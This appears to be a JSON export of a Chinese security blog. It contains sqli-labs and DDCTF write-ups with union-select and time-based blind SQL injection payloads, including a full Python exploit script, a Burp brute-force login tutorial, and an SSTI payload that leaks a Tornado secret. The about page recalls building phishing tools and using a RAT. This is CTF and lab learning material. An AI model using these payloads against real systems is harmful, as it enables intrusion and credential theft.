{"meta":{"title":"1eAder","subtitle":"一个热爱网络技术的少年(已不是少年).","description":"本博客专注于ctf比赛和网络安全攻防技术，热爱网络技术并且也很愿意结交热爱网络技术的你们.我是一个热爱网络技术的少年","author":"1eAder","url":"https://leaderzhang.github.io"},"pages":[{"title":"about","date":"2018-10-12T03:13:08.000Z","updated":"2018-10-12T07:34:18.178Z","comments":true,"path":"about/index.html","permalink":"https://leaderzhang.github.io/about/index.html","excerpt":"","text":"关于我(1eAder) &emsp;&emsp;喜欢网络技术的一个人少年…但是，我好像已不在是少年了。&emsp;&emsp;是呀，一晃都已经大三了，过的真快。 ##意识——学习安全的“火苗”&emsp;&emsp;了解网络技术这一块是从小学六年级的时候，那时候打游戏，突然了解到外挂这个东西，就去各个论坛上找外挂，什么猴岛、QQTZ这些论坛。然后，账号就被盗了。。。当时是DNF账号被洗得一干二净，那个时代一把紫剑就可以炫耀半天，结果就被洗号了。所以就对安全意识有提高了，知道要怎么来防御盗号，QQ密保这些东西得用上。 ##怒火——学习安全的“动力”&emsp;&emsp;之后，又被盗了一次号，那时候原因也忘了，只记得当时十分的气愤，因为盗号者用我的QQ向我们班上的女同学要了100块钱。。。那时候才六年级呀。。然后女同学就被骗了一百，So，我真的很生气，为了报复，我开始百度——“盗号”这一关键词，那个时候的盗号技术就是用易语言写钓鱼软件，两个输入框，一个按钮，伪装成QQ登陆界面或者刷钻软件，后台用asp程序或者QQ邮箱接收账号密码。我就去了解了易语言，不得不说，他是我们中国人计算机软件发明中，可以算伟大的一类软件了。至今，几乎所有游戏外挂都是用易语言写的。&emsp;&emsp;到了初中，我自学了(asp旋风+3322动态域名+新云asp程序)这类简单的简单建站技术，还去学习了灰鸽子怎么使用，怎么基础的免杀(花指令)。还有用啊D注入工具这些软件进行sql批量注入攻击。初中的时候对这些是最有时间又最感兴趣的，那时候研究怎么搞坏别人电脑，怎么去骗别人打开软件——社工。平均我家一个星期坏一次电脑，然后拿去重装系统。&emsp;&emsp;当然，我也要打游戏，谈恋爱~ ##瞎混——进入安全的“开始”&emsp;&emsp;差不多初中结束的时候，开始对网站渗透这一块很感兴趣了，当然，我是一个脚本小子，没有什么实质上的研究，就拿着胡萝卜、啊D等工具，到处试注入点。对了，那时候的黑客，没有不知道乌云的。那时候的流行的技术开始向XSS这方面发展了，最出名的一个就是乌云上的一个系列，然后就是剑心——xsser。那时候开始逛习科、法克(听潮)、社工联盟、红客联盟等论坛。后来，就是高中了，高中就玩去了，只拿过学校网站首页和学校wifi这些。那时候刷一会儿补天。。。 ##重生——重新开始的“决心”&emsp;&emsp;上了大学，发现自己真的很多东西都不懂，但是以前的经历又给我带来了很多别人没有的意识和思维。学习安全这块，思维和意识是最重要的东西。知识含量都不算很重要，因为可以现学习。所以，我开始疯狂学习，Linux，Windows，Python，Php，msf等。Linux真的很重要，至少把shell脚本学习好了，不差没饭吃。Windows也很重要，在大公司里，都是域的天下。Python和php是学习安全的基础，但是我学的不精，只是能看懂，但真正老老实实写，还是不行，但是可以靠复制粘贴写出一个项目。为什么发现自己不足呢？因为，在2017年12月份的时候，我去参加了人生第一个CTF比赛，那时候我们学校两个队，但是另一个队比我厉害了。我自认为我比他们不差，可是我们属于倒数的名次。所以，我下定决心，下次，我要超越他们。So，我开始有了目标，了解CTF这些技术的实质。其实就是套路而已，你需要去猜出题人的点，猜到，你就getflag，否则就干望着。我开始对Web这方面的CTF题型研究，并且对python这块也开始学习。终于，在代表学校参加的重庆市高职技能大赛中，获得二等奖，为学校拿下代表重庆出线的名额。到了全国的比赛，那真的是了解到了山外有山。也知道了，别人学校愿意花钱培养学生，重视信息安全这方面，舍得投入。&emsp;&emsp;对了，在学习的期间，我还是每天都养成逛论坛和安全方面的网站的习惯。&emsp;像Freebuf 安全客这些是现在比较好的安全资讯网站 文章来自1eAder创作，转载请联系本人 作者 @1eAder2018 年 10月 11日"},{"title":"categories","date":"2018-10-12T15:01:37.000Z","updated":"2018-10-12T15:01:37.263Z","comments":true,"path":"categories/index.html","permalink":"https://leaderzhang.github.io/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"sqli-labs-less-4通关笔记","slug":"sqli-labs-less4","date":"2018-10-19T08:49:41.000Z","updated":"2018-10-19T09:12:53.571Z","comments":true,"path":"2018/10/19/sqli-labs-less4/","link":"","permalink":"https://leaderzhang.github.io/2018/10/19/sqli-labs-less4/","excerpt":"","text":"Sql注入学习笔记——基于Sqli-labs平台(Less-4)第四关开始 老规矩，单引号测试下 哟呵，小娘子，没报错。那么咱们就测试下双引号 发现报错了，报错内容：near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1 ok，猜测后台查询语句格式如下： select * from users where id = (&quot;$id&quot;) limit 0,1 输入index.php?id=1&quot;)--+测试 页面正常了，证明语句闭合成功，接下来就是老套路了。 测试and 1=1和and 1=2 order by 查询字段数量index.php?id=1&quot;) order by 1--+..index.php?id=1&quot;) order by 4--+测试出为三个字段 接下来测试回显位 index.php?id=-1&quot;) union select 1,2,3--+ 回显位为2和3 然后就是老步骤了。。。 所以我就直接最后一步 index.php?id=-1&quot;) union select 1,username,password from users limit 3,1--+ 为了验证注入成功，我选择users表中的第4行数据","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/categories/sqli-labs/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/tags/sqli-labs/"}]},{"title":"sqli-labs-less-3通关笔记","slug":"sqli-labs-less3","date":"2018-10-19T06:56:34.000Z","updated":"2018-10-19T07:31:56.486Z","comments":true,"path":"2018/10/19/sqli-labs-less3/","link":"","permalink":"https://leaderzhang.github.io/2018/10/19/sqli-labs-less3/","excerpt":"","text":"Sql注入学习笔记——基于Sqli-labs平台(Less-3)废话不多说，继续干 单引号测试 发现报错，内容为： near ''1'') LIMIT 0,1' at line 1 猜测后台语句结构为： select * from users where id = (&#39;$id&#39;) limit 0,1 进一步验证是否为此类结构测试index.php?id=1&#39;)--+看是否报错 OK！页面正常，证明猜测的语句没有问题 接下来就是老套路了，order by猜测字段数我这里偷懒了，直接测试order by 3和order by 4可以证明有三个字段数 查询回显位： 接下来的操作跟前面一样，所以我还是直接最终步骤。为了测试效果不一样，我取users表第三行数据","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/categories/sqli-labs/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/tags/sqli-labs/"}]},{"title":"sqli-labs-less-2通关笔记","slug":"sqli-labs-less2","date":"2018-10-19T05:18:32.000Z","updated":"2018-10-19T05:19:46.728Z","comments":true,"path":"2018/10/19/sqli-labs-less2/","link":"","permalink":"https://leaderzhang.github.io/2018/10/19/sqli-labs-less2/","excerpt":"","text":"Sql注入学习笔记——基于Sqli-labs平台(Less-2)废话不多说，我准备做一个关于mysql注入的一个终极教程，但是由于自己要不断学习，先把sqli-labs给都练一遍再来总结和写作。我想用最简单，精炼的文字让别人学会sql注入这项攻击手法。加油！ 先单引号测试，看报错信息 发现这题的sql语句类似：select * from users where id = $id limit 0,1所以并不用进行闭合语句 ok，接着测试and 1=1 和and 1=2看看会不会产生逻辑错误、可以看到，and 1=2返回页面为空值，所以可以判定为注入点 那么再来判断字段数，利用order by语句 可以看到，在进行order by 4的时候提示错误信息——没有四个字段，证明字段数为：3 接下来就来测试回显位：可以看到回显位为2和3 接下来的操作跟less-1就一样了，我直接上最终步骤为了证明注入成功，我取users表第二个数据","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/categories/sqli-labs/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/tags/sqli-labs/"}]},{"title":"暴力破解表单-无验证码","slug":"crack-form","date":"2018-10-18T02:58:39.000Z","updated":"2018-10-18T03:01:22.487Z","comments":true,"path":"2018/10/18/crack-form/","link":"","permalink":"https://leaderzhang.github.io/2018/10/18/crack-form/","excerpt":"","text":"表单暴力破解——无验证码“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：1.是否要求用户设置复杂的密码；2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；4.是否采用了双因素认证；…等等。千万不要小看暴力破解漏洞,往往这种简单粗暴的攻击方式带来的效果是超出预期的! 你可以通过“BurteForce”对应的测试栏目，来进一步的了解该漏洞。 从来没有哪个时代的黑客像今天一样热衷于猜解密码 —奥斯特洛夫斯基 环境准备：pikachu靶机环境工具准备：Burp Suite 打开搭建好的靶机环境：选择表单破解类中的基于表单的暴力破解 我们先对登陆框进行基本的Fuzz 账号或密码错误时的提示信息:username or password is not exists～ 进行抓包分析，可以看到POST了三个值，username=xxx、password=xxx、submit=login其中submit参数是校验表单提交的，为固定值 接下来，把数据包发送到Intruder中去 攻击类型选择Cluster bomb 清除工具自动识别的变量 设置需要爆破的参数变量 设置payloads加载模式 参数1选择simple list 参数2同样设置然后参数1选择load加载字典文件，加载用户名字典，参数2加载密码字典。设置好后点击Start Attack即可 根据length返回的不同值来判断是否为正确账号密码一般来说，不一样的就是正确的账号密码啦~当然还可以通过Grep Match选项来匹配","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"https://leaderzhang.github.io/categories/WEB安全/"}],"tags":[{"name":"暴力破解","slug":"暴力破解","permalink":"https://leaderzhang.github.io/tags/暴力破解/"}]},{"title":"sqli-labs-less-1通关笔记","slug":"sqli-labs-less1","date":"2018-10-17T02:47:52.000Z","updated":"2018-10-17T02:50:29.281Z","comments":true,"path":"2018/10/17/sqli-labs-less1/","link":"","permalink":"https://leaderzhang.github.io/2018/10/17/sqli-labs-less1/","excerpt":"","text":"Sql注入学习笔记——基于Sqli-labs平台(Less-1) 因为我的知识比较杂而不精，每次遇到SQL注入题都是sqlmap一把梭。这样对于技术层面没有多大的帮助，而且我用sqlmap也不深，像一些tamper类型的参数，我也并不熟练。我还是决定回归基础，好好的把sql注入学习一下。 平台选择：&emsp;&emsp;Sqli-Labs&emsp;&emsp;这是一款学习sql注入经典的平台，里面的sql注入类型基本都有。工具选择：&emsp;&emsp;火狐浏览器-Hackbar（手工注入利器） Less-1首先，分析参数，题目有提示： Please input the ID as parameter with numeric value OK，给个id为1的值。在网页url后输入?id=1可以看到页面产生了变化。 and 1=1测试 页面正常显示： and 1=2测试 页面非正常显示： 猜测字段数 可以看到，在进行order by 4测试的时候，页面报错。大致意思是没有第四个字段能被order命令显示。所以我们确定，该表字段数为3个。 测试显示位 得到显示位为2和3 猜测数据库名得到数据库名为：security 读取表名 读取users表字段名获取到字段名id,username,password 读取users表第三条数据内容获取第三条数据内容，username：Dummy|password：p@ssword 数据库验证结果：","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/categories/sqli-labs/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://leaderzhang.github.io/tags/sqli-labs/"}]},{"title":"DDCTF WEB1 数据库的秘密","slug":"DDCTF-WEB1-writeup","date":"2018-10-15T15:13:49.000Z","updated":"2018-10-16T02:48:06.918Z","comments":true,"path":"2018/10/15/DDCTF-WEB1-writeup/","link":"","permalink":"https://leaderzhang.github.io/2018/10/15/DDCTF-WEB1-writeup/","excerpt":"","text":"#DDCTF WEB1 数据库的秘密 最近的比赛很多，但是成绩都不是很好，准备安心的学习一段时间。。。 所以，想重新做一下一些有质量的ctf题目。 DDCTF的环境没有关（真的很良心~） 所以我准备把DDCTF的题目重新做一遍 #WEB1 数据库的秘密 1.绕过XFF靶机：http://116.85.43.88:8080/NQYPTEMNWRQIYLEP/dfe3ia/index.php 首先提示 非法链接，只允许来自 123.232.23.245 的访问 所以想到XFF绕过，将headers的头部添加 X-Forwarded-For:123.232.23.245 2.寻找可利用点进来后发现是一个表格，有三个文本框和一个按钮。任意提交内容时，发现url中有sig和time参数 进行抓包分析时，发现会请求两个js文件，并且有一个隐藏表单“author”也被提交了。 查看源码可以找到两个js文件的地址和一个key值 分析math.js时可以看出，应该是一个加密程序，并且需要传递key值和data表单数据进去，然后js会返回sig数据。 对id或者title等参数进行fuzz时，会发现有防火墙。并且过滤了一些字符，但是我发现，它这个WAF不是根据单个字符串来判定，而是通过 1’ and 1=1#1’ and union select 这些组合式的语句进行拦截 根据经验，这是个Nginx+lua_waf，github上有Bypass教程 但是这个waf也可以绕过 联合查询的固定语句是 union select 所以靠联合查询是不行的。 那就利用盲注来实行SQL注入。 布尔型和时间型都可以，根据个人爱好来选择。。 我们对author这个参数进行注入，因为题目把它隐藏应该有一定道理的。 贴上一位大神的思路，他用php来中转参数进行注入，先用php处理参数，构建带有sig和time参数的url，然后让sqlmap来跑。https://www.anquanke.com/post/id/144879 我的脚本是基于时间注入的，因为我用布尔注入，TMD要么被拦截，要么不返回注入该有的页面。 import execjs import requests as req import time flag = '' url=\"http://116.85.43.88:8080/NQYPTEMNWRQIYLEP/dfe3ia/index.php?sig=\" headers = { \"X-Forwarded-For\": \"123.232.23.245\" } def get_sig(author): js = req.get(\"http://116.85.43.88:8080/NQYPTEMNWRQIYLEP/dfe3ia/static/math.js\").text ctx = execjs.compile(js) key=\"\\141\\144\\162\\145\\146\\153\\146\\167\\145\\157\\144\\146\\163\\144\\160\\151\\162\\165\" times = str(int(time.time())) data = \"id={id}title={title}author={author}date=time={time}\".format(id=\"\",title=\"\",time=times,author=author) return (ctx.call('hex_math_enc',data+key)) def check(sqlin): time1 = str(int(time.time())) sig = get_sig(sqlin) new_url = url +sig+ \"&time=\" + time1 post_data = { 'id':'', 'title':'', 'author':sqlin, 'date':'', 'button':'search' } reqs = req.post(url=new_url,data=post_data,headers=headers) data = reqs.content.decode('utf-8') if \"sig\" in data: print(\"sig error\") if \"time\" in data: print(\"time error\") if \"防火墙\" in data: print(\"防火墙拦截\") if time.time()- startTime>1: return 1 else: return 0 def main(): global flag global startTime offset = 1 kw = 'DCTFQWERYUIOPASGHJKLZXVBMN{}_qwertyuiopasdfghjklzxcvbnm1234567890_@-' for i in range(1, 256): for j in kw: startTime = time.time() payload = \"a%' && if((selEct substr(secvalue,{0},1) from ctf_key9 )='{1}',sleep (2),1)='%\" .format(offset,j) if check(payload) ==1: flag += j offset += 1 print(flag) break if len(flag)>0 and flag[-1] == '}': break if __name__ == '__main__': main()","categories":[{"name":"CTF","slug":"CTF","permalink":"https://leaderzhang.github.io/categories/CTF/"}],"tags":[{"name":"DDCTF","slug":"DDCTF","permalink":"https://leaderzhang.github.io/tags/DDCTF/"}]},{"title":"服务端模板注入(SSTI)学习笔记","slug":"study-ssti","date":"2018-10-13T19:02:55.000Z","updated":"2018-10-13T19:14:56.285Z","comments":true,"path":"2018/10/14/study-ssti/","link":"","permalink":"https://leaderzhang.github.io/2018/10/14/study-ssti/","excerpt":"","text":"#服务端模板注入(SSTI)学习笔记 我在学习laravel的时候，了解到了模板引擎这一说法。一般来说，框架型的网站都会用到模板引擎这个东西，因为这个东西很方便开发者从后端传递给前端一些特定的值，来到达前后端的交互。 So，模板注入这个东西的起因就是因为方便 ##如何造成的注入呢？ 学习Web安全的时候，有一条规则是大家公认的。 一切用户可控的值，都是不安全的 用这次护网杯的一道WEB题来了解SSTI easy tornado 打开网站后，是这样的：依次打开链接后得到的信息： /file?filename=Orz.txt&amp;signature=0434ba1fadd43ce31661c315fbb8a9c6 Orz.txtrender() /file?filename=hint.txt&amp;signature=78423a4ae34f2a6e9088a35ef650af22 hint.txtmd5(cookie_secret + md5(filename)) /file?filename=flag.txt&amp;signature=dbc862f7ca4cd3dd4ba82c6e7ff6d6af flag.txt/fllllllllllag 第一个Orz.txt提示render() render()是一般python Web应用框架中渲染模板的函数所以应该往SSTI方面想 第二个hint.txt提示了一段加密算法对题目基础测试的时候，会发现这一段加密算法应该就是signature的算法。 第三个flag.txt提示了flag所在的文件 我们随意读取一个文件时，他会报错，网页提示是签名错误 我们看到有一个msg的参数，对它Fuzz一波，可以发现，传的值会返回在页面上 所以想到第一个提示的render()的作用就应该在这里体现出来。 由于是tornado框架，没怎么接触过，所以我们得去官网找一找关于模板引擎的文档 可以了解到，服务端在render()函数中传递参数的值的用法1self.render(&apos;index.html&apos;, contents=CONTENTS_LIST) 在html模板文件中接收值的用法： 表示在html中取服务端的CONTENTS_LIST的内容。 接下来我们要想办法读取hint.txt里面加密算法的值 filename对应url里面的filename值 但是cookie_secret这个东西是什么？ 百度一波后知道，是tornado为了cookie的安全设置的一个值 官方对Cookie_secret这个值的解释文档 我们可以看到，当MainHandler传递值时，会创建一个名叫settings的dict，而cookie_secret就在里面。并且，settings会随着MainHandler传递到前端去。这样我们就可以构造一个payload： 1/error?msg=&#123;&#123;handler.settings&#125;&#125; 我们就可以得到cookie_secret了 然后把它用hint.txt里面的加密算法带入进去计算一下。 提示：由于cookie_secret里面有特殊字符，需要将特殊字符原封不动得带入 python脚本： 12345678910import hashlibcookie_secret=r&apos;WhzKS&#123;Z.*~k)L@XEt3UT%GB04(NAV[l1ojuD!-?]2Hg&lt;rx&#125;QmnCOpJ9+c8&gt;&amp;qI6s&apos;def md5(code): temp = hashlib.md5(str(code)).hexdigest() return tempfilename = &apos;/fllllllllllag&apos;res = md5(cookie_secret + md5(filename))print res 其实这项漏洞很早就被发现，但为什么不能被广大利用呢？因为这在真实的生产环境很少用到，在现在的网站中，已经很少有直接将用户的值直接显示在页面上的。一般都会将值实体化编码后再输入。 推荐学习的链接： web-hacking-101中文版第十六章模板注入 Burpsuite关于SSTI的用法和讲解 服务器端模板注入(SSTI) 服务端注入之Flask框架中服务端模板注入问题 Flask Jinja2开发中遇到的的服务端注入问题研究 python 模板注入","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"https://leaderzhang.github.io/categories/WEB安全/"}],"tags":[{"name":"SSTI","slug":"SSTI","permalink":"https://leaderzhang.github.io/tags/SSTI/"}]},{"title":"怎样将域名绑定到github pages 博客上","slug":"how-to-bind-domain-with-github","date":"2018-10-12T07:35:27.000Z","updated":"2018-10-12T15:08:45.314Z","comments":true,"path":"2018/10/12/how-to-bind-domain-with-github/","link":"","permalink":"https://leaderzhang.github.io/2018/10/12/how-to-bind-domain-with-github/","excerpt":"","text":"1、添加CNAME文件 在仓库根目录下添加一个CNAM文件，没有后缀名，里面内容为你的域名(如:test.com),不需要添加http/www等前缀。 ping yougithubname.github.io记录下IP地址 2、添加 DNS Service记录 去DNSPod注册个账号，添加域名，设置两个A记录。分别是@和w w w，ip地址填上个步骤获取的IP地址。 3、设置域名的DNS 在相应域名的Csutom DNS里，设置DNS service,添加两条记录f1g1ns1.dnspod.net和f1g1ns2.dnspod.net 4、漫长的等待 要全球解析生效，得等上一会了，也可以先ping一下自己的设置对不对。","categories":[{"name":"建站","slug":"建站","permalink":"https://leaderzhang.github.io/categories/建站/"}],"tags":[{"name":"github","slug":"github","permalink":"https://leaderzhang.github.io/tags/github/"}]},{"title":"Hexo+Github搭建博客","slug":"start-hexo","date":"2018-10-12T06:19:54.000Z","updated":"2018-10-12T15:06:42.044Z","comments":true,"path":"2018/10/12/start-hexo/","link":"","permalink":"https://leaderzhang.github.io/2018/10/12/start-hexo/","excerpt":"","text":"Hexo博客搭建(Hexo+Github) &emsp;&emsp;之前我的博客采用的是Emlog+Niginx+Php+Mysql方式搭建的，这样效果感觉不是很好，所以想尝试大佬们都在用的Hexo博客。不得不说，这个Hexo博客的模式，我很早之前也这么想过，因为真的很安全，不存在什么漏洞行为了，前后端彻底分离了。 &emsp;&emsp;Hexo博客 是比较方便写作的博客了，不像其他博客程序，可以变换多种，变成CMS或者小说站等等。所以，我觉得以后每天来记录我的学习情况，这样有助于技术上的成长~ &emsp;&emsp;废话不多说，搭建前的准备： 本地服务器(win7)——用于本地创作文稿 Github账号——用于存放你的博客内容 本地服务器准备阶段 因为我本地用的虚拟机(不想占用太多物理机的地方，虽然也占用不了多少。。) 虚拟机可以用linux或者windows，这个看你自己的操作习惯。本地服务器的作用其实就是用来写作，因为最终我们是要PUSH到github上面去的。 1.先下载Git,一路Next选择就ok啦~2.创建一个文件夹，用来存放本地博客。我这里取名为blog Github准备阶段 Github是全球最大的基友社交平台。So….怎么能少了我们呢？？ 1.创建github账号2.Create a new repository3.Repository name填写:leaderzhang.github.io （自行替换leaderzhang字符串）4.记得勾选一下Initialize this repository with a README 开始搭建 因为我本地是Windows环境，所以安装的Node.js是Node for windows，centos、ubuntu等系统安装Node.js的话很快，一条命令就ok。so，自行百度解决~ 1.先在本地服务器上下载Node.js——LTS是稳定版，Current是最新版 2.打开Git Bash 输入命令，修改npm的registry为淘宝镜像。1npm config set registry &quot;https://registry.npm.taobao.org&quot; 3.查看npm版本1npm -v 4.进入blog文件夹，输入命令，安装Hexo 在blog文件夹右键Git Bash Here，然后输入：1npm install -g hexo-cli 5.安装Hexo博客程序 在blog文件夹下输入1hexo init 安装完后就会出现以下目录结构 ├── _config.yml├── package.json├── scaffolds├── source| ├── _drafts| └── _posts└── themes _config.yml网站的 配置 信息，您可以在此配置大部分的参数。package.json应用程序的信息。EJS, Stylus 和 Markdown renderer 已默认安装，您可以自由移除。scaffolds模版文件夹。当您新建文章时，Hexo 会根据 scaffold 来建立文件。Hexo的模板是指在新建的markdown文件中默认填充的内容。例如，如果您修改scaffold/post.md中的Front-matter内容，那么每次新建一篇文章时都会包含这个修改。source资源文件夹是存放用户资源的地方。除 _posts 文件夹之外，开头命名为 _ (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 public 文件夹，而其他文件会被拷贝过去。themes主题文件夹。Hexo 会根据主题来生成静态页面。 啥都先别管，咱先接着来~ 6.在本地生成git ssh密钥书以及配置Git的账户名和邮箱 &emsp;在Git Bash中输入:12345678git config --global user.name &quot;leaderzhang&quot; //设置账户名git config --global user.email &quot;xxxx@xx.com&quot; //设置账户邮箱ssh-keygen -t rsa -C &quot;youremail@example.com&quot; //生成证书文件 连续三个回车就行，密码为空cd ~/.ssh 有两个文件，id_rsa和id_rsa.pubcat id_rsa.pub //复制里面的内容 7.将id_rsa.pub的内容复制到github里&emsp;1)打开github&emsp;2)点击右上角头像,点击settings进入设置&emsp;3)点击SSH and GPG keys&emsp;4)点击New ssh keys&emsp;5)粘贴进去即可 8.在Git Bash中验证key是否正确1ssh -T git@github.com 如果没什么错误，会看到hi!Hello,xxxx等字样 9.修改_config.yml文件 用编辑器打开你的blog项目，修改_config.yml文件的一些配置(冒号之后都是有一个半角空格的)：1234deploy: type: git repo: https://github.com/YourgithubName/YourgithubName.github.io.git branch: master 10.启动Hexo 在blog文件夹下，分别执行下列命令：1234567hexo clean //清除缓存文件hexo generate //生成静态文件。简写为 hexo ghexo server //启动服务器。默认情况下，访问网址为： http://localhost:4000/。 选项 描述 -p, --port 重设端口 -s, --static 只使用静态文件 -l, --log 启动日记记录，使用覆盖记录格式 这时候，打开localhost:4000即可看到惊艳的Hexo博客了 11.把博客放到Github上&emsp;&emsp;先安装一波：install hexo-deployer-git --save```123（这样才能将你写好的文章部署到github服务器上并让别人浏览到）执行命令(建议每次都按照如下步骤部署)：在blog文件夹下，输入以下命令： hexo cleanhexo generatehexo deploy //注意deploy的过程中要输入你的username及passward` 在浏览器中输入 yourgithubname.github.io 就可以看到你的个人博客啦，是不是很兴奋！感觉gitbash中东西太多的时候输入clear命令清空 文章来自1eAder创作，转载请联系本人 作者 @1eAder2018 年 10月 11日","categories":[{"name":"建站","slug":"建站","permalink":"https://leaderzhang.github.io/categories/建站/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://leaderzhang.github.io/tags/Hexo/"}]}]}